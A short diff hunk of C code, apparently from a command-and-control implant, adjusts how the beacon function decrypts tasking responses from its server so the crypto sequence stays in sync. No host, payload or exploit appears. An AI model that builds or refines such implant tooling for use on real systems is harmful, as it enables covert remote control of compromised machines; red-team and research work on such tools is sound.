@@ -784,11 +784,11 @@ aegis_result_t aegis_c2_beacon(aegis_c2_ctx_t *ctx, uint8_t *task_out,
     return rc;
   }
 
-  /* If body contains tasking data, decrypt it */
-  if (body_len > sizeof(aegis_c2_envelope_t)) {
+  /* If body contains tasking data, decrypt it to sync crypto sequence */
+  if (body_len >= sizeof(aegis_c2_envelope_t)) {
     const aegis_c2_envelope_t *resp_env = (const aegis_c2_envelope_t *)body;
 
-    if (resp_env->magic == AEGIS_C2_HEADER_MAGIC && resp_env->payload_len > 0) {
+    if (resp_env->magic == AEGIS_C2_HEADER_MAGIC) {
 
       const uint8_t *resp_ct = body + sizeof(aegis_c2_envelope_t);
       size_t resp_ct_len = resp_env->payload_len;
